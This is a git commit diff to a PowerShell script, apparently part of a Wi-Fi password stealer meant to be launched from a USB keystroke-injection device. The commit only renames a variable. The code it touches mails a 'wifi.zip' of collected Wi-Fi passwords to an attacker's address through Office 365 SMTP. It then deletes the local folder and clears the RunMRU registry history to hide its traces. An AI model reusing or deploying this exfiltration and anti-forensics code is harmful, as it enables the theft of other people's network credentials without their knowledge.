4af289181f47335dc600dc036d8bf8ab899c03e6
GiKR-byte <pi.pico@outlook.de>
2022-10-18 10:10:22 +0200

    Update Test.ps1

--- original ps1 and bat files/Test.ps1
+++ original ps1 and bat files/Test.ps1
@@ -3,13 +3,13 @@ $SMTPServer = 'smtp.office365.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
 $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER EMAIL HERE', 'SENDER EMAIL PASSWORD HERE')
-$ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'SENDER EMAIL HERE'
-$ReportEmail.To.Add('SEND TO EMAIL HERE')
-$ReportEmail.Subject = "WiFi Passwords Script by GiKR-byte"
-$ReportEmail.Body = "Here You Go... script by GiKR-byte on GitHub https://github.com/GiKR-byte"
-$ReportEmail.Attachments.Add("wifi.zip")
-$SMTPInfo.Send($ReportEmail)
+$wifimail = New-Object System.Net.Mail.MailMessage
+$wifimail.From = 'SENDER EMAIL HERE'
+$wifimail.To.Add('SEND TO EMAIL HERE')
+$wifimail.Subject = "WiFi Passwords Script by GiKR-byte"
+$wifimail.Body = "Here You Go... script by GiKR-byte on GitHub https://github.com/GiKR-byte"
+$wifimail.Attachments.Add("wifi.zip")
+$SMTPInfo.Send($wifimail)
 Remove-Item wifi -Recurse -Force -Confirm:$false
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
 exit
